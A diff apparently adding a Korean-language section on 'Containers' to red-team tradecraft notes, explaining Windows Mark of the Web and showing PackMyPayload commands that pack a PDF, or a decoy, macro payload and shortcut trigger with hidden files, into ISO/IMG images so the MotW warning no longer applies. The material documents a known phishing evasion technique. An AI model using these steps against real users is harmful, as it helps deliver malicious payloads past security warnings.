@@ -9,6 +9,8 @@
   - [Payloads](#payloads)
   - [Droppers](#droppers)
   - [Triggers](#triggers)
+  - [Containers](#containers)
+  - [Delivery](#delivery)
 - [Persistence](#persistence)
   - [Boot & Logon Autostart Execution](#boot--logon-autostart-execution)
   - [Logon Script](#logon-script)
@@ -148,6 +150,64 @@ MSC 파일을 더블 클릭하면 mmc.exe 인스턴스가 실행되고, mmc.exe�
 > MSC 페이로드 자동화 생성 도구(MSC_Dropper)
 
 [https://github.com/ZERODETECTION/MSC_Dropper](https://github.com/ZERODETECTION/MSC_Dropper)
+
+
+### Containers
+---
+
+#### Mark of the Web
+Mark of the Web(MotW)은 인터넷에서 다운로드한 파일이 잠재적으로 안전하지 않을 수 있음을 나타내는 영역 식별자이다. 파일 탐색기에서 파일 속성을 확인하거나 PowerShell을 사용해 MotW 표시 여부를 확인할 수 있다. 
+
+
+<img width="363" height="509" alt="image" src="https://github.com/user-attachments/assets/3c42b1ef-52fd-493c-8996-a2fc39d0b680" />
+
+``` powershell
+PS C:\Users\Attacker\Downloads> Get-Content -Stream Zone.Identifier .\test.pdf
+[ZoneTransfer]
+ZoneId=3
+ReferrerUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
+HostUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
+```
+
+MotW는 피싱 공격 시 문제가 될 수 있는데, MotW가 포함된 파일을 열거나 실행하려고 하면 Windows에서 추가적인 보안 경고를 표시할 수 있기 때문이다. 또한, Office 문서와 같은 일부 파일은 MotW가 있는 경우 매크로 기능을 사용할 수 없게된다. 
+
+컨테이너는 트리거, 페이로드, 디코이와 같은 종속 요소를 단일 파일로 묶는 방법을 제공한다. 대표적으로 ISO/IMG, ZIP, WIM 형식과 같은 Windows에서 기본적으로 지원되는 파일 형식이나 7z, Gz, WinRAR과 같은 형식은 피해자가 필요한 소프트웨어를 갖추고 있어야 함.
+
+PackMyPayload와 같은 도구를 사용하여 PDF 파일을 ISO 파일로 압축할 수 있다. 
+
+``` shell
+attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Downloads$ /mnt/c/Tools/PackMyPayload/PackMyPayload.py test.pdf test.iso
+
+[.] Packaging input file to output .iso (iso)...
+Burning file onto ISO:
+    Adding file: /test.pdf
+[+] File packed into ISO.
+
+[+] Generated file written to (size: 65536): test.iso
+```
+
+이후 마운트하면 MotW가 더 이상 PDF에 적용되지 않은 것을 확인
+
+<img width="487" height="619" alt="image" src="https://github.com/user-attachments/assets/33f963fc-fbeb-494e-b596-79adc69d3b12" />
+
+
+`-H` 옵션을 통해 특정 파일(decoy.xlsx, payload.xlam) 숨기기
+
+``` shell
+$ ls -l /mnt/c/Payloads/xlam
+
+-rwxrwxrwx 1 rasta rasta 11607 Jun 27 13:55 decoy.xlsx
+-rwxrwxrwx 1 rasta rasta 12906 Jun 27 13:55 payload.xlam
+-rwxrwxrwx 1 rasta rasta  2094 Jun 28 13:55 trigger.xls.lnk
+```
+
+``` shell
+$ python3 PackMyPayload.py -H decoy.xlsx,payload.xlam /mnt/c/Payloads/xlam /mnt/c/Payloads/xlam/package.img
+```
+
+
+### Delivery
+---
 
 
 ## Persistence
